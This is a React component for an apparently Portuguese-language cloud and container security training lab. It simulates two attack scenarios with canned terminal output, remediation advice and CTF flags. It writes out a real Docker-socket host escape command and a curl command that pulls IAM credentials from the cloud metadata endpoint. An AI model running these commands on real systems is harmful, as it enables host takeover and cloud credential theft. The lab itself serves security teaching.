import React, { useState } from 'react';
import { 
  Cloud, 
  Box, 
  ShieldAlert, 
  CheckCircle2, 
  Key, 
  Lock, 
  Layers, 
  Terminal, 
  Play, 
  RotateCcw,
  Server
} from 'lucide-react';

interface CloudScenario {
  id: string;
  title: string;
  category: 'Container Breakout' | 'Cloud IAM & IMDS' | 'Kubernetes RBAC';
  description: string;
  technique: string;
  commandSimulated: string;
  outputLog: string;
  defenseRemediation: string;
  flagReward: string;
}

const CLOUD_SCENARIOS: CloudScenario[] = [
  {
    id: 'scen-docker-socket',
    title: 'Container Escape via Docker Socket (/var/run/docker.sock)',
    category: 'Container Breakout',
    description: 'Um container web com o socket do Docker montado monta o sistema de arquivos raiz do host e obtém controle total do nó pai.',
    technique: 'Docker API Volume Mount Host Breakout',
    commandSimulated: 'docker -H unix:///var/run/docker.sock run -v /:/host_fs -it alpine chroot /host_fs /bin/bash',
    outputLog: `[CONTAINER ESCAPE DETECTADO]
Montando host filesystem '/' dentro do container sob '/host_fs'...
Executando chroot em /host_fs...
Sessão de shell root aberta diretamente no HOST LINUX!
UID=0(root) GID=0(root) host_hostname=srv-k8s-worker-01`,
    defenseRemediation: 'Nunca expor ou montar /var/run/docker.sock em contêineres de terceiros; utilizar contêineres sem privilégios (Rootless Podman/Docker).',
    flagReward: 'FLAG{WINLINX_CLOUD_DOCKER_SOCKET_ESCAPE_2026}'
  },
  {
    id: 'scen-imds-ssrf',
    title: 'Roubo de Token de IAM via SSRF no IMDSv1 (169.254.169.254)',
    category: 'Cloud IAM & IMDS',
    description: 'Exploração de Server-Side Request Forgery contra o serviço de metadados da instância de nuvem para extrair chaves de acesso temporárias.',
    technique: 'Instance Metadata Service (IMDSv1) Credential Exfiltration',
    commandSimulated: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/K8sNodeRole',
    outputLog: `{
  "Code": "Success",
  "LastUpdated": "2026-11-26T20:40:15Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAVIBECODINGEXPLOIT",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEIz//////////wEaCXVzLWVhc3QtMS...",
  "Expiration": "2026-11-27T02:45:00Z"
}`,
    defenseRemediation: 'Exigir IMDSv2 com token de sessão obrigatório e limitar contagem de saltos de rede (hop limit = 1).',
    flagReward: 'FLAG{WINLINX_CLOUD_IMDS_SSRF_TOKEN_STOLEN_2026}'
  }
];

export const CloudContainerLabView: React.FC = () => {
  const [selectedScenario, setSelectedScenario] = useState<CloudScenario>(CLOUD_SCENARIOS[0]);
  const [executing, setExecuting] = useState<boolean>(false);
  const [terminalOutput, setTerminalOutput] = useState<string>('');
  const [completed, setCompleted] = useState<boolean>(false);

  const handleSimulateAttack = () => {
    setExecuting(true);
    setTerminalOutput(`$ ${selectedScenario.commandSimulated}\n[Executando comando no container...]`);
    setCompleted(false);

    setTimeout(() => {
      setExecuting(false);
      setTerminalOutput(`$ ${selectedScenario.commandSimulated}\n\n${selectedScenario.outputLog}`);
      setCompleted(true);
    }, 600);
  };

  return (
    <div className="space-y-6 animate-in fade-in duration-300">
      {/* Header */}
      <div className="bg-gradient-to-r from-slate-900 via-sky-950/40 to-slate-900 border border-sky-500/30 rounded-2xl p-6 shadow-2xl relative overflow-hidden">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
          <div className="flex items-center space-x-3">
            <div className="p-3 bg-sky-500/10 border border-sky-500/30 rounded-xl text-sky-400">
              <Cloud className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center space-x-2">
                <h1 className="text-xl font-bold text-slate-100">Cloud & Container Workload Defense (K8s & Docker)</h1>
                <span className="px-2 py-0.5 text-[10px] font-mono rounded bg-sky-950 text-sky-300 border border-sky-800">
                  CONTAINER BREAKOUT RANGE
                </span>
              </div>
              <p className="text-xs text-slate-400 mt-0.5">
                Simulação de fugas de contêineres para o Host, auditoria de Docker Socket e exfiltração de metadados de nuvem via IMDS.
              </p>
            </div>
          </div>

          <div className="flex items-center space-x-2">
            <button
              onClick={handleSimulateAttack}
              disabled={executing}
              className="flex items-center space-x-2 px-4 py-2 bg-gradient-to-r from-sky-600 to-blue-600 hover:from-sky-500 hover:to-blue-500 text-white rounded-xl text-xs font-semibold shadow-lg shadow-sky-600/20 transition cursor-pointer"
            >
              <Play className="w-3.5 h-3.5 fill-white" />
              <span>{executing ? 'Explorando...' : 'Disparar Exploit no Container'}</span>
            </button>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Catálogo de Cenários */}
        <div className="lg:col-span-1 space-y-4">
          <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-xl space-y-3">
            <h3 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center space-x-2">
              <Box className="w-4 h-4 text-sky-400" />
              <span>Cenários de Nuvem & Contêiner</span>
            </h3>

            <div className="space-y-2">
              {CLOUD_SCENARIOS.map(scen => {
                const isSelected = scen.id === selectedScenario.id;
                return (
                  <div
                    key={scen.id}
                    onClick={() => {
                      setSelectedScenario(scen);
                      setTerminalOutput('');
                      setCompleted(false);
                    }}
                    className={`p-3.5 rounded-xl border transition cursor-pointer ${
                      isSelected
                        ? 'bg-sky-950/40 border-sky-500/50 shadow-md'
                        : 'bg-slate-950/60 border-slate-800/80 hover:border-slate-700'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-xs font-bold text-slate-200">{scen.title}</span>
                    </div>
                    <span className="text-[10px] px-1.5 py-0.5 rounded font-mono uppercase bg-sky-950 text-sky-300 border border-sky-800">
                      {scen.category}
                    </span>
                    <div className="text-[11px] text-slate-400 mt-2">{scen.description}</div>
                  </div>
                );
              })}
            </div>
          </div>

          <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-5 shadow-xl space-y-2">
            <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center space-x-2">
              <Lock className="w-4 h-4 text-emerald-400" />
              <span>Remediação Recomendada</span>
            </h4>
            <p className="text-xs text-slate-300 leading-relaxed">
              {selectedScenario.defenseRemediation}
            </p>
          </div>
        </div>

        {/* Terminal do Container & Host */}
        <div className="lg:col-span-2 space-y-4">
          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 shadow-2xl flex flex-col h-[480px]">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800 mb-2">
              <div className="flex items-center space-x-2">
                <Terminal className="w-4 h-4 text-sky-400" />
                <span className="text-xs font-mono font-bold text-slate-200">Terminal de Container Bash (alpine-node)</span>
              </div>
              <span className="text-[10px] font-mono text-slate-400">Namespace: pid/net/ipc isolated</span>
            </div>

            <pre className="flex-1 overflow-y-auto font-mono text-xs text-slate-300 p-2 select-text leading-relaxed whitespace-pre-wrap">
              {terminalOutput || 'Selecione um cenário e clique em "Disparar Exploit no Container" para testar o escape.'}
            </pre>

            {completed && (
              <div className="mt-2 pt-3 border-t border-slate-800 flex items-center justify-between bg-sky-950/20 p-2.5 rounded-xl border border-sky-900/40">
                <div className="flex items-center space-x-2 text-xs text-sky-300">
                  <CheckCircle2 className="w-4 h-4 text-sky-400" />
                  <span>Vetor de escape ou roubo de credencial validado com sucesso!</span>
                </div>
                <div className="px-2.5 py-1 bg-sky-900/80 border border-sky-700 text-sky-200 text-xs font-mono font-bold rounded">
                  {selectedScenario.flagReward}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
